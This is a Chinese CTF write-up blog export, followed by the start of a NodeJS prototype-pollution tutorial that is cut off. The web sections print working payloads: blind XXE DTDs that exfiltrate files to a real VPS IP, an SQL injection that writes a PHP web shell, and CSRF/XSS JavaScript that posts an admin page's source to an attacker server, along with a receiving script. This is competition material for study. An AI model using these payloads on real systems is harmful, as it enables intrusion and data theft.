<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab <span class="string">&quot;HELLO&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;	</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>提交SVG图片源码地址发现实体成功显示</p>
<p>然后尝试读取文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>页面虽然正常返回信息，但是并不能直接读到我们想要的东西</p>
<p>无回显，又是XXE，可以尝试一下XXE盲打，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。</p>
<p>构造1.svg</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">&quot;http://39.105.158.221:1234/1.dtd&quot;</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">        &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>构造1.dtd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">        <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://39.105.158.221:1234/?%file;&#x27;&gt;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>注意这里使用伪协议读取源码，因为xml解析器支持使用php://filter进行编码。</p>
<p>这里需要vps上随便在一个文件夹上开启http服务，然后把1.svg合1.dtd丢进去即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>在网页提交1.svg的链接即可成功读取到.bash_history</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /app</span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>然后利用SSRF打内网</p>
<p>查看源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/app/index.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>发现sql注入，写入url编码后的一句话木马</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3C?php%20system($%5fGET%5bcmd%5d)%3b%3e%27%20into%20outfile%27/app/dashabi.php%27%23</span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=ls&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=cat%20H3re_1s_y0ur_f14g.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="fake-phpminiadmin"><a href="#fake-phpminiadmin" class="headerlink" title="fake phpminiadmin"></a>fake phpminiadmin</h2><p>开启nc监听</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>然后在content处输入nc监听的链接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">39.105</span><span class="number">.158</span><span class="number">.221</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>下面的code原来的验证码，比如：substr(md5(?), 0, 6) = b1a0fd，这里的验证码就是？。</p>
<p>需要一个脚本来爆破，这里贴一下解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;2ff56c&#x27;</span>   <span class="comment">#已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = int(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="comment">#print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>] == keymd5:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">list=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool(<span class="number">100</span>)    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.map(findmd5, list) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p>看到Referer: <a href="http://127.0.0.1//admin_shark.php">http://127.0.0.1//admin_shark.php</a></p>
<p>这是管理员的后台地址，访问提示登陆地点错误。</p>
<p><strong>思路</strong></p>
<ul>
<li>执行sql语句处利用hex可以进行xss</li>
<li>contact功能处可以csrf</li>
<li>那我们可以将csrf的payload放在vps上，在contact处提交vps上payload的地址来触发xss读取后台源码。</li>
</ul>
<p>用于CSRF的表单</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;exp&quot;</span> action=<span class="string">&quot;http://127.0.0.1/sql.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;sql&quot;</span> value=<span class="string">&quot;select 0x3c734372497074207372433d2f2f78732e73622f56346f383e3c2f7343526970543e&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">document.exp.submit()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这个是放在XSS平台的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function createXmlHttp() &#123;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlHttp = new XMLHttpRequest()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var MSXML = new Array(<span class="string">&#x27;MSXML2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>, <span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (var n = <span class="number">0</span>; n &lt; MSXML.length; n++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                xmlHttp = new ActiveXObject(MSXML[n]);</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125; catch(e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">createXmlHttp();</span><br><span class="line">xmlHttp.onreadystatechange = function()&#123;</span><br><span class="line">  <span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        code=escape(xmlHttp.responseText);</span><br><span class="line">        createXmlHttp();</span><br><span class="line">        url = <span class="string">&quot;http://39.105.158.221:1215/re.php&quot;</span>;   //这里是我们服务器接受的地址</span><br><span class="line">        cc = <span class="string">&quot;htmlcode=&quot;</span> + code +<span class="string">&quot;&amp;filename=index.html&quot;</span>;</span><br><span class="line">        xmlHttp.open(<span class="string">&quot;POST&quot;</span>, url, true);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xmlHttp.send(cc)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlHttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/admin_shark.php&quot;</span>, true);//这块填写获得的后台地址。</span><br><span class="line">xmlHttp.setRequestHeader(<span class="string">&quot;Referer&quot;</span>, <span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">xmlHttp.send(null);</span><br></pre></td></tr></table></figure>

<p>接收源码EXP</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        function js_unescape($str) &#123;</span><br><span class="line">                $ret = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                $len = strlen($str);</span><br><span class="line">                <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $len;$i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span> &amp;&amp; $str[$i + <span class="number">1</span>] == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                                $val = hexdec(substr($str, $i + <span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                                <span class="keyword">if</span> ($val &lt; <span class="number">0x7f</span>) $ret.= chr($val);</span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span> ($val &lt; <span class="number">0x800</span>) $ret.= chr(<span class="number">0xc0</span> | ($val &gt;&gt; <span class="number">6</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                <span class="keyword">else</span> $ret.= chr(<span class="number">0xe0</span> | ($val &gt;&gt; <span class="number">12</span>)) . chr(<span class="number">0x80</span> | (($val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                $i+= <span class="number">5</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">                                $ret.= urldecode(substr($str, $i, <span class="number">3</span>));</span><br><span class="line">                                $i+= <span class="number">2</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> $ret.= $str[$i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $ret;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = js_unescape($_POST[<span class="string">&#x27;htmlcode&#x27;</span>]);  //对获得源码js_unescape解码。</span><br><span class="line">        $filename = $_POST[<span class="string">&#x27;filename&#x27;</span>] . date(<span class="string">&quot;y-m-d-h-i-s&quot;</span>) . <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">        $myfile = fopen($filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite($myfile, $data);</span><br><span class="line">        fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后在content处访问CSRF表单即可</p>
<img src="http://img.kawhi.xyz/image-20200616230446072.png" alt="image-20200616230446072" style="high:80%;width:80%;" />

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="py吗？"><a href="#py吗？" class="headerlink" title="py吗？"></a><strong>py吗？</strong></h2><p>题目是一张老外穿着python文化衫的图片。</p>
<p>修改正常高度恢复正常的crc32校验。</p>
<p>然后Stegsolve-&gt;Analyse-&gt;Data Extract</p>
<p>发现base64，解码即可得到flag。</p>
<h2 id="夏日计划"><a href="#夏日计划" class="headerlink" title="夏日计划"></a>夏日计划</h2><p>下载下来是拖进010发现是一个RAR压缩文件，用360解压打开直接拖出来即可。发现secret.rar损坏，用WinRAR修复，打开发现四个文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret<span class="number">-1</span></span><br><span class="line">secret<span class="number">-2</span></span><br><span class="line">secret<span class="number">-3</span></span><br><span class="line">secret<span class="number">-4</span></span><br></pre></td></tr></table></figure>

<p>这里看官方wp是伪加密修改这里。</p>
<img src="http://img.kawhi.xyz/image-20200616091015847.png" alt="image-20200616091015847" style="high:80%;width:80%;" />

<p>然后文件4合1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">copy /b <span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>+<span class="number">4</span> new.txt</span><br></pre></td></tr></table></figure>

<p>可以使用gnuplot转化图像，也可使用PIL</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">140</span>,<span class="number">140</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&#x27;new.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]),int(point[<span class="number">1</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p>得到汉信码扫码可得flag。</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>在wireshark里面导出Http对象列表，发现flag.jpg，改zip后缀</p>
<img src="http://img.kawhi.xyz/image-20200616104946314.png" alt="image-20200616104946314" style="high:80%;width:80%;" />

<p>然后crc32解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python crc32.py reverse <span class="number">0xC</span>RC32</span><br></pre></td></tr></table></figure>

<p>连起来即可得到flag。</p>
<h2 id="easy-analysis"><a href="#easy-analysis" class="headerlink" title="easy_analysis"></a>easy_analysis</h2><p>使用的是windows版</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">volatility.exe -f memory imageinfo <span class="comment">#判断系统，猜测为 win7SP1X64</span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 pslist <span class="comment">#查看进程 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 cmdscan <span class="comment">#查看命令行记录，发现flag 文件夹。 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 filescan|findstr <span class="string">&quot;flag&quot;</span> <span class="comment">#尝试查找带 flag 的文件发现一个 analyse.zip 文件 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000001e85f430</span> --dump-dir=outdir <span class="comment">#导出文件，修改文件名 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 hashdump <span class="comment">#查看密码，使用md5解密解出密码AaBbCc123</span></span><br></pre></td></tr></table></figure>

<p>使用密码解压usb流量包</p>
<p>usb流量分析：<a style="text-decoration:none;" class="foo" href="http://www.ga1axy.top/index.php/archives/10/" target="_blank">传送门</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed ‘/^\s*$/d’ &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p>base64隐写：<a style="text-decoration:none;" class="foo" href="https://www.jianshu.com/p/48fe4dd3e5ce" target="_blank">传送门</a></p>
<p>分离数据，breakautokey.py爆破，得到压缩包密码THISKEYBOARDSUCKSFORYOU，然后再base64隐写解开即可得到flag。</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>从文件提取出一段字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R00yVE1NWlRIRTJFRU5CWUdVM1RNUlJURzRaVEtOUllHNFpUTU9CV0lJM0RRTlJXRzQ0VE9OSlhHWTJET05aUkc1QVRPTUJUR0kyRUVNWlZHNDNUS05aWEc0MlRHTkpaR1pBVElNUldHNDNUT05KVUc0M0RPTUJXR0kyRUtOU0ZHTTRUT09CVUc0M0VFPT09Cgo=</span><br></pre></td></tr></table></figure>

<p>CyberChef网站</p>
<p>base64-base32-魔法棒即可得到flag。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>NodeJs学习</title>
    <url>/2020/07/20/NodeJs%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>学习一波NodeJs</p>
<h1 id="原型"><a href="#原型" class="headerlink" title="原型"></a><strong>原型</strong></h1><p>首先要搞清楚<code>prototype</code>，<code>__proto__</code>，<code>constructor</code>这三个东西。</p>
<p>在JS中，声明一个函数Foo的同时，浏览器会在内存中创建一个对象，然后Foo函数默认有一个属性<code>prototype</code>指向了这个对象，这个对象就是函数Foo的<strong>原型对象</strong>，简称为函数的原型。这个对象默认会有个属性<code>constructor</code>指向了这个函数Foo。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype.constructor)<span class="comment">//[Function: Foo]</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过函数Foo创建一个实例对象foo，foo默认会有一个属性<code>__proto__</code>指向了函数Foo的原型对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.__proto__)<span class="comment">//Foo &#123;&#125;</span></span><br><span class="line"><span class="comment">//Foo.prototype == foo.__proto__</span></span><br></pre></td></tr></table></figure>

<p>原型链是就是比如对象调用一个属性eat的时候</p>
<ol>
<li>在对象Lee中寻找eat属性</li>
<li>如果找不到，则在<code>Lee.__proto__</code>中寻找eat属性</li>
<li>如果仍然找不到，则继续在<code>Lee.__proto__.__proto__</code>中寻找eat属性</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<img src="http://img.kawhi.xyz/image-20200719212225968.png" style="high:100%;width:100%;" />

<p><strong>小结</strong></p>
<ul>
<li><p>对象有<code>__proto__</code> 和 <code>constructor</code>两种属性。</p>
<p>对象的<code>__proto__</code>属性，指向对象所在函数的<code>prototype</code>属性。</p>
<p>对象的<code>constructor</code>属性就是<strong>指向该对象的构造函数</strong>，所有函数最终的构造函数都指向<strong>Function</strong>。</p>
</li>
<li><p>函数有<code>prototype</code> 和 <code>__proto__</code> 和 <code>constructor</code> 三种属性。</p>
<p>函数的<code>prototype</code>指向这个函数的原型对象，并且<code>prototype</code>是函数特有的属性。</p>
</li>
</ul>
<p>题外话：ES6模板字符串</p>
<p>用反引号里面可以加入模板，例如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fruit = <span class="string">&#x27;apple&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`i like <span class="subst">$&#123;fruit&#125;</span> very much`</span>);</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i like apple very much</span><br></pre></td></tr></table></figure>

<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a><strong>原型链污染</strong></h1><p>JS的这种继承是动态的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="built_in">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)<span class="comment">//Name: Melania Trump</span></span><br></pre></td></tr></table></figure>

<p>这里修改一下代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="built_in">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line">son.__proto__[<span class="string">&#x27;add_name&#x27;</span>] = <span class="string">&#x27;kk&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> son1 = <span class="keyword">new</span> Son();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`son Name: <span class="subst">$&#123;son.add_name&#125;</span>`</span>);<span class="comment">//son Name: kk</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`son1 Name: <span class="subst">$&#123;son1.add_name&#125;</span>`</span>);<span class="comment">//son1 Name: kk</span></span><br></pre></td></tr></table></figure>

<p>我们可以惊讶的发现一个对象son修改自身的原型的属性的时候会影响到另外一个具有相同原型的对象son1。甚至可以再上一层。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">son.__proto__.__proto__[<span class="string">&#x27;boy&#x27;</span>] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(son1.boy);<span class="comment">//123</span></span><br></pre></td></tr></table></figure>

<p>这里可以对比一下java的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Son</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.name = <span class="string">&quot;father&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">alert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i am son&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Son s1 = <span class="keyword">new</span> Son();</span><br><span class="line">        System.out.println(s1.name);<span class="comment">//father</span></span><br><span class="line">        s1.name = <span class="string">&quot;son&quot;</span>;</span><br><span class="line">        System.out.println(s1.name);<span class="comment">//son</span></span><br><span class="line">        Son s2 = <span class="keyword">new</span> Son();</span><br><span class="line">        System.out.println(s2.name);<span class="comment">//father</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到两者的继承方式机制可以说完全不一样的，一个是基于对象来继承，一个是基于原型来继承。</p>
<h2 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a><strong>利用手段</strong></h2><p>以对象merge为例，我们想象一个简单的merge函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
